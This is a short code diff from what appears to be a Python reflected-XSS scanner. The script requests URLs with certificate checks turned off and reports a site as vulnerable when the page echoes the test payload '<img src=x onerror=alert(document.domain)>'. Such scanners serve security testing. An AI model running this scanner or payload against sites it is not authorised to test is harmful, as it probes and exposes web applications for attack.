@@ -17,4 +17,12 @@ def send_request(line):
     try:
         r = requests.get(line, headers=headers, verify=False, timeout=15)
         content = r.content
-       
+        if b"<img src=x onerror=alert(document.domain)>" in content:
+            print(colored("\n\n[+] Vulnerable -> ") + line + "\n")
+    except KeyboardInterrupt:
+        exit()
+    except Exception as error:
+        print(line, error)
+
+splitted_urls = split_file(file, payload)
+array_length = len(splitted_urls)
